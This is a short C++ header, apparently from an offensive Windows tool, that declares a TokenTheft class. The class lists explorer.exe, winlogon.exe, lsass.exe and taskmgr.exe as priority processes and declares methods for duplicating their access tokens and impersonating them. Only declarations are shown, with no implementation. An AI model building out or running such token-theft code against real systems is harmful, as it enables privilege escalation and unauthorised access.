#pragma once
#include "Recon.h"
#include <string>
#include <vector>
#include <windows.h>


class TokenTheft {
private:
	std::vector<std::string> priorityProcesses = { "explorer.exe", "winlogon.exe", "lsass.exe", "taskmgr.exe" };
	HANDLE	hProcessSnapshot;
	BOOL	_TryImpersonateByPriorityProcesses();
	BOOL	_TryImpersonateByName(const std::wstring& processName);
	BOOL	_DuplicateTokenByProcessID(DWORD processID);
	BOOL	_TryImpersonateBySnapshot();
public:
	TokenTheft();
	~TokenTheft();

	BOOL StartImpersonation();
};
